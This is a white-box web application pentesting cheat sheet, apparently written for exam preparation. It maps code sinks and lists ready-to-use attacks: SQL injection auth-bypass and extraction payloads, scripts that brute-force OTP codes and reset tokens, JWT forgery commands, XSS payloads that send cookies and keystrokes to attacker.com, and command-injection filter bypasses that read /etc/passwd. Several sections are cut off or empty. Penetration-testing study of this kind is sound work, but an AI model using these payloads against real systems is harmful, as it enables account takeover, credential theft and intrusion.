1. Source Code Review

White-box review starts by mapping every route that accepts user input, then tracing that input through the codebase to dangerous sinks. Any tainted data reaching a sink without proper sanitization is exploitable.

1.1 Grep Patterns for Sinks & Sources

Search for dangerous functions first, then trace backward to find which user-controlled inputs reach them.

# ---- PHP sinks ----
grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/
grep -rn "unserialize\|include\|require\|file_get_contents\|file_put_contents" src/
grep -rn "mysqli_query\|PDO->query\|pg_query\|mysql_query" src/

# ---- PHP sources ----
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\$_SERVER\[.HTTP_" src/

# ---- Python sinks ----
grep -rn "os\.system\|subprocess\.\|eval(\|exec(\|render_template_string" .
grep -rn "pickle\.loads\|yaml\.load\b\|yaml\.unsafe_load" .
grep -rn "\.execute(.*%\|\.execute(.*format\|\.execute(.*f\"\|\.raw(" .

# ---- Java sinks ----
grep -rn "Runtime\.exec\|ProcessBuilder\|ScriptEngine\|Expression" src/
grep -rn "ObjectInputStream\|readObject\|XMLDecoder" src/
grep -rn "createQuery.*+\|nativeQuery.*+\|Statement.*execute.*+" src/

# ---- Node.js sinks ----
grep -rn "eval(\|Function(\|child_process\|execSync\|spawn" .
grep -rn "deserialize\|node-serialize\|vm\.runInNewContext" .
grep -rn "__proto__\|\[.constructor.\]\|\[.prototype.\]" .

# ---- C# / .NET sinks ----
grep -rn "BinaryFormatter\|NetDataContract\|LosFormatter\|XmlSerializer" src/
grep -rn "Process\.Start\|cmd\.exe\|PowerShell" src/
grep -rn "SqlCommand\|ExecuteReader\|ExecuteNonQuery\|FromSqlRaw" src/

1.5 Manual Taint Tracking

For each sink found via grep, trace backward: which function calls it, what parameter carries attacker data, and what sanitization (if any) runs in between.

# Find parameters flowing into queries (PHP)
grep -rn "query\s*=\s*.*\$_\(GET\|POST\|REQUEST\)" src/

# Find unescaped user output (PHP XSS)
grep -rn "echo\s.*\$_\(GET\|POST\)" src/

# Find format-string SQL (Python)
grep -rn "execute.*%s\|execute.*format\|execute.*f\"" .

# Find unsafe template rendering (Python)
grep -rn "render_template_string\|Template(" .

# Find request.getParameter flowing into sinks (Java)
grep -rn "getParameter\|getHeader\|getCookies" src/ | head -50

# Semgrep automated taint tracking
semgrep --config p/owasp-top-ten src/

1.7 Language-Specific Tips

PHP: Watch for == vs === (type juggling), extract() overwriting variables, $$var variable variables, preg_replace with /e modifier (code execution), and assert() evaluating strings.

// Dangerous PHP patterns
extract($_POST);           // overwrites any variable in scope
$$key = $value;            // variable variable - attacker controls var name
preg_replace('/.*/e', $input, '');  // /e = eval replacement (PHP < 7)
assert($userInput);        // evaluates string as PHP code
create_function('', $code); // equivalent to eval

Java: Check for Expression Language (EL) injection, unsafe reflection, JNDI lookups with user input (lookup(userInput)), and XML parsers without DTD disabled.

// Dangerous Java patterns
Runtime.getRuntime().exec(userInput);
new ProcessBuilder(userInput).start();
new ObjectInputStream(socket.getInputStream()).readObject();
ctx.lookup("ldap://" + userInput);  // JNDI injection
engine.eval(userInput);             // ScriptEngine eval

Node.js: Watch for prototype pollution via merge()/extend(), vm module sandbox escapes, child_process with unsanitized input, and require() with user-controlled paths.

// Dangerous Node.js patterns
eval(userInput);
child_process.exec('cmd ' + userInput);
require(userInput);                       // arbitrary module load
vm.runInNewContext(userInput);             // sandbox escape possible
_.merge(target, JSON.parse(userInput));   // prototype pollution

Python: Watch for eval()/exec(), pickle.loads() on untrusted data, yaml.load() without Loader=SafeLoader, format string injection via .format(**locals()), and subprocess.call(shell=True).

# Dangerous Python patterns
eval(user_input)
exec(user_input)
pickle.loads(base64.b64decode(cookie))
yaml.load(user_data)                        # use yaml.safe_load()
subprocess.call(f"echo {user_input}", shell=True)
render_template_string(user_input)           # SSTI

C#: Watch for BinaryFormatter.Deserialize(), Process.Start(), raw SQL via SqlCommand string concat, XmlDocument with DTD processing enabled, and ViewState without MAC validation.

// Dangerous C# patterns
new BinaryFormatter().Deserialize(stream);
Process.Start("cmd.exe", "/c " + userInput);
new SqlCommand("SELECT * FROM users WHERE id=" + id, conn);
XmlDocument doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver();  // allows XXE
doc.LoadXml(userInput);

2. Authentication Bypass

Auth bypass targets the login, registration, and password-reset flows. In white-box exams you can read the exact comparison logic and craft precise payloads.

2.1 SQL Injection Auth Bypass

When a login query is string-concatenated, inject a comment that makes the WHERE clause always true or terminates the password check.

-- Classic bypass payloads
username: admin'--
username: admin'#               -- MySQL comment
username: ' OR '1'='1
username: ' OR 1=1--
password: ' OR 1=1--

-- Second-user injection
username: validuser'/*
password: */OR'1'='1

-- Bypass hash comparison (SQLi in password field)
password: ' OR password LIKE '%

-- Specific to different quote styles
username: admin"--              -- if query uses double quotes
username: admin\                -- escape the closing quote

2.2 Logic Flaws

Look for flawed conditional checks, missing return statements after redirects, and incorrect operator precedence in auth guards.

// Missing return after redirect - code continues executing
if (!$authenticated) {
    header("Location: /login");
    // missing: exit; or return;
}
// This code still runs for unauthenticated users
$secret_data = get_admin_panel();

// Incorrect boolean logic
if ($role != "admin" || $role != "moderator") {  // always true!
    deny();  // should use && not ||
}

// IDOR in role check (checking parameter instead of session)
$role = $_GET['role'];    // attacker supplies role=admin
if ($role === 'admin') {
    show_admin_panel();
}

// Default allow pattern
$allowed = true;
foreach ($rules as $rule) {
    if ($rule->matches($request)) {
        $allowed = $rule->isAllowed();  // only updates if a rule matches
    }
}
// If no rule matches, $allowed stays true
# Flask: decorator order matters
@app.route('/admin')
# @login_required  <-- missing decorator = unauthenticated access
def admin_panel():
    return render_template('admin.html')

# Django: missing LoginRequiredMixin on class-based view
class AdminView(TemplateView):  # should include LoginRequiredMixin
    template_name = 'admin.html'

# Express: middleware not applied to specific route
app.get('/admin', adminController.panel);  // no auth middleware
// Should be: app.get('/admin', authMiddleware, adminController.panel);

2.3 JWT Attacks

Decode every JWT header to find the algorithm, then test algorithm confusion, none signature, and weak secrets.

# Decode without verification
jwt_tool "eyJ..." -d

# Algorithm confusion: RS256 -> HS256, sign with public key as HMAC secret
jwt_tool "eyJ..." -X a -pk public.pem

# "alg: none" attack - strip signature
jwt_tool "eyJ..." -X n

# Brute-force weak HS256 secret
jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt

# Forge token with tampered claims
jwt_tool "eyJ..." -T -S hs256 -p "discovered_secret"

# JWKS injection: host your own key and point jku/x5u to it
jwt_tool "eyJ..." -X s -ju "http://attacker.com/jwks.json"
AttackCondition

JKU/X5U injectionServer fetches key from attacker-controlled URL

2.4 Session Fixation

If the app does not regenerate the session ID after login, an attacker who sets a known session cookie before authentication can hijack the session post-login.

# 1. Attacker obtains a valid session ID
curl -v http://target/login
# Set-Cookie: PHPSESSID=attacker_controlled_value

# 2. Trick victim into using that session ID (via XSS, meta tag, subdomain cookie)
# <script>document.cookie="PHPSESSID=attacker_controlled_value"</script>

# 3. Victim logs in - session ID stays the same
# 4. Attacker uses the known session ID to access the authenticated session
curl -b "PHPSESSID=attacker_controlled_value" http://target/dashboard

2.5 Password Reset Flaws

Reset flows are prime pre-auth targets: predictable tokens, host-header injection, and parameter pollution.

# Predictable token (timestamp-seeded PRNG)
import random, time, requests
TARGET = "http://target/reset"
now = int(time.time())
for seed in range(now - 10, now + 10):
    random.seed(seed)
    token = "".join(random.choice("0123456789abcdef") for _ in range(32))
    r = requests.get(f"{TARGET}?token={token}", allow_redirects=False)
    if r.status_code == 200:
        print(f"[+] Valid token: {token}")
        break
# Host header injection: reset link points to attacker server
curl -X POST http://target/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@corp.com"
# Victim clicks link: http://attacker.com/reset?token=SECRET

# HTTP parameter pollution: two email params
curl -X POST http://target/forgot-password \
  -d "email=victim@corp.com&email=attacker@evil.com"
# Some frameworks: first for DB lookup, second for mail delivery

2.6 MFA Bypass

Common bypasses: skip the MFA step by directly requesting the post-MFA endpoint, reuse OTP codes that are not invalidated, brute-force short OTP codes without rate limiting, or exploit race conditions with concurrent requests.

# Direct access to post-MFA page (missing server-side check)
curl -b "session=authenticated_cookie" http://target/dashboard

# OTP brute-force (4-digit code, no rate limiting)
for i in $(seq 0000 9999); do
  code=$(printf "%04d" $i)
  resp=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "session=sess_cookie" \
    -d "otp=$code" http://target/verify-mfa)
  if [ "$resp" != "403" ]; then
    echo "[+] Valid OTP: $code"
    break
  fi
done

3. SQL Injection

SQL injection remains the most common web vulnerability. In white-box review, locate every raw SQL query that concatenates user input instead of using parameterized queries.

3.1 UNION-Based SQLi

UNION injection appends a second SELECT to the original query. You need the correct column count and compatible data types.

-- Step 1: Find column count
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 5-- -     -- increase until error

-- Step 2: Find displayable columns
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT 'a',NULL,NULL,NULL,NULL-- -

-- Step 3: Extract data
' UNION SELECT username,password,NULL,NULL,NULL FROM users-- -
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -

3.2 Error-Based SQLi

-- MySQL: extractvalue / updatexml
' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- -
' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)-- -

-- PostgreSQL: cast error
' AND 1=CAST((SELECT version()) AS int)-- -

-- MSSQL: convert error
' AND 1=CONVERT(int, (SELECT @@version))-- -
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysdatabases))-- -

3.3 Blind SQLi

-- Boolean-based
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)>64-- -

-- Time-based (MySQL)
' AND IF(1=1, SLEEP(5), 0)-- -
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)-- -

-- Time-based (PostgreSQL)
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- Time-based (MSSQL)
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT SUBSTRING(name,1,1) FROM sysusers WHERE uid=1)='d' WAITFOR DELAY '0:0:5'-- -

3.4 Second-Order SQLi

Input is stored safely but used unsafely later. Register a username like admin'--, then trigger a password change that uses the stored username in a raw query.

# Step 1: Register with malicious username
requests.post(f"{TARGET}/register", data={
    "username": "admin'-- ",
    "password": "password123",
    "email": "attacker@evil.com"
})

# Step 2: Login as the new user
s = requests.Session()
s.post(f"{TARGET}/login", data={"username": "admin'-- ", "password": "password123"})

# Step 3: Change password - backend query uses stored username unsafely:
# UPDATE users SET password='new' WHERE username='admin'-- '
s.post(f"{TARGET}/change-password", data={"new_password": "hacked123"})

# Step 4: Login as admin with the new password
s.post(f"{TARGET}/login", data={"username": "admin", "password": "hacked123"})

3.5 ORM Bypass

ORMs are not immune. Raw query methods, operator injection, and JSON/array parameter manipulation can bypass ORM protections.

# Django raw SQL (vulnerable)
User.objects.raw("SELECT * FROM users WHERE name = '%s'" % name)

# Django extra() with injection
User.objects.extra(where=["name = '%s'" % name])

# SQLAlchemy text() without bind params
db.session.execute(text("SELECT * FROM users WHERE id = " + user_id))
// Sequelize literal injection
User.findAll({ where: { name: sequelize.literal(`'${userInput}'`) } });

// MongoDB NoSQL injection (operator injection)
// POST: {"username": {"$gt": ""}, "password": {"$gt": ""}}
db.collection('users').findOne({ username: req.body.username, password: req.body.password });

4. Cross-Site Scripting (XSS)

XSS injects client-side script into web pages viewed by other users. In source code review, look for any user input rendered without encoding in HTML, JavaScript, or attribute contexts.

4.1 Reflected XSS

# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>

# Event handler injection in attributes
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
" onmouseover=alert(1) "

# JavaScript context breakout
';alert(1)//
"-alert(1)-"
\'-alert(1)//

4.2 Stored XSS

Stored XSS persists in the database and fires for every user who views the affected page. Common injection points: profile fields, comments, filenames, email headers, and log viewers.

// Cookie stealer
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>

// Fetch-based exfiltration (bypasses some CSP)
<script>
fetch("http://attacker.com/log", {
  method: "POST",
  body: document.cookie
});
</script>

// Keylogger injection
<script>
document.onkeypress = function(e) {
  new Image().src = "http://attacker.com/keys?k=" + e.key;
};
</script>

4.3 DOM-Based XSS

DOM XSS never hits the server. Vulnerable sinks include innerHTML, document.write(), eval(), and location.href. Sources: location.hash, location.search, document.referrer, window.name, postMessage.

// Vulnerable DOM sink examples
document.getElementById("output").innerHTML = location.hash.slice(1);
document.write("<h1>" + decodeURIComponent(location.search) + "</h1>");
eval("var x = '" + location.hash.slice(1) + "'");
jQuery("#div").html(userInput);
$(".target").append(userInput);

// Exploit: http://target/#<img src=x onerror=alert(1)>

6. Insecure Deserialization

Deserialization vulnerabilities occur when untrusted data is passed to a deserialize function. The attacker crafts a serialized object that triggers dangerous operations (RCE, file access) during or after deserialization.

6.1 PHP (unserialize)

PHP unserialize() instantiates objects and calls magic methods (__wakeup, __destruct, __toString). Chain gadgets from application classes or frameworks.

// Vulnerable code

// Gadget chain: find a class with __destruct or __wakeup that calls dangerous functions
// Example: class with __destruct that writes to a file
class LogWriter {
    public $filename;
    public $data;
    function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}
// Payload: serialize object to write a webshell

10. Command Injection

Command injection occurs when user input is passed to OS command execution functions. In source code review, search for shell execution sinks and trace whether user data reaches them without sanitization.

10.1 OS Command Injection Patterns

# Command separators / chaining
; id
| id
|| id
& id
&& id
$(id)
`id`

# Newline injection
%0aid
%0d%0aid

# Subshell / command substitution
$(whoami)
`whoami`

# Common vulnerable patterns in code:
# ping -c 1 <user_input>
# nslookup <user_input>
# convert <user_input> output.png

10.2 Filter Bypass

FilterBypass
Blocks spaces${IFS}, {cat,/etc/passwd}, cat</etc/passwd, X=$'\x20'&&cat${X}/etc/passwd
Blocks /${PATH:0:1} (= /), $(echo L2V0Yy9wYXNzd2Q=|base64 -d)
Blocks keywordswh''oami, wh\oami, w"h"oami, /???/??t /???/p??s?? (glob)
Blocks backticks$(command)
Character blacklistHex: $'\x63\x61\x74' (= cat), Base64 decode pipe
Length limit>a, >b, ls>c, sh c (write commands to files)

10.3 Eval / Code Injection

Code injection differs from OS command injection: the payload is interpreted by the application's language runtime, not the OS shell.

// PHP assert()
// Vulnerable: assert($_GET['page'] . '.php');

# Payload: __import__('os').system('id')

# Python format string injection

11. CSRF & CORS

Cross-Site Request Forgery forces authenticated users to perform unintended actions. CORS misconfigurations allow malicious sites to read responses from APIs they should not access.

11.1 CSRF Token Bypass

BypassCondition
Remove token entirelyServer does not validate if token is absent
Empty token valueServer checks token presence but not value
Reuse another user's tokenToken not tied to session (global pool)
Use GET instead of POSTServer accepts both methods
Change Content-Typeapplication/x-www-form-urlencoded instead of application/json
Token in cookie onlyDouble-submit pattern with subdomain cookie injection

    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body>
</html>

// CSRF with JSON body via form
